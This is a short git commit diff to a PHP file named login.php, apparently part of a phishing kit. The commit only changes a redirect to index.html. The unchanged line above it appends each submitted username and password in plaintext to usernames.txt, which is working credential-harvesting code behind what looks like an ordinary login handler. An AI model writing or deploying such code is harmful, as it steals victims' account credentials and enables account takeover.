a3dc9b3e212d5f5c75a0c9c276d5f25212b09a87
dindin0 <112889633+dindin0@users.noreply.github.com>
2022-09-07 18:28:33 +0100

    Update login.php

--- login.php
+++ login.php
@@ -1,7 +1,7 @@
 <?php
 
 file_put_contents("usernames.txt", "Account: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
-header('Location: ');
+header('Location: index.html');
 exit();
 
 ?>
